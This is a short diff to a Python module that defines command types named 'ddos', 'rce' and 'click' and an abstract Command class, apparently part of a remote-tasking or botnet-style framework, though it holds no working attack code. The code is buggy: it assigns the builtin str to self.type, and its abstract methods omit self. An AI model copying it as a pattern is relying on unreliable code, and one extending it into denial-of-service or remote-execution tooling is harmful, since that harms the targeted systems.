@@ -2,16 +2,21 @@ from abc import ABC, abstractmethod
 import uuid
 from enum import Enum
 
+
 class CommandType:
     DDoS = 'ddos'
     RCE = 'rce'
     CLICK = 'click'
 
+
 class Command(ABC):
+    """
+    Command definition
+    """
+
     def __init__(self, type: str, atomic: bool = True) -> None:
-        self.id = uuid.uuid4()
         self.type = str
-        self.is_atomic = atomic
+        self.is_atomic = atomic  # Indicates if a command is a one shot or a long process
 
     @abstractmethod
     def process() -> None:
@@ -20,4 +25,3 @@ class Command(ABC):
     @abstractmethod
     def stop() -> None:
         pass
-    
